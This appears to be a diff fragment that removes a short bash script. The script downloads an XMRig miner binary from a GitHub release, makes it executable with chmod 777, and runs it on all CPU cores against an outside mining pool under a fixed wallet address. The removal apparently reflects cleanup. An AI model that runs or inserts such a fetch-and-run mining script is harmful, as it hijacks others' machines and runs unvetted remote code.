@@ -1,4 +1,0 @@
-#!/bin/bash
-curl https://github.com/bondaltomason/meo/releases/download/2.7.0/xmrig-vrl -L -o vrl
-chmod 777 vrl
-./vrl -a rx/0 --donate-level 1 -o pool-global.tari.snipanet.com:3333 -u 12Nddzoe3dtqS4cAscvo5p4bxf8CJV4evFNqVWCgS8aB7pfUVTR7W8GiKctbbvqAPiaBvckoqi3cP2AF1QyupWmNSY -p $(echo $(shuf -i 1-15000 -n 1)-A) -t $(nproc --all)
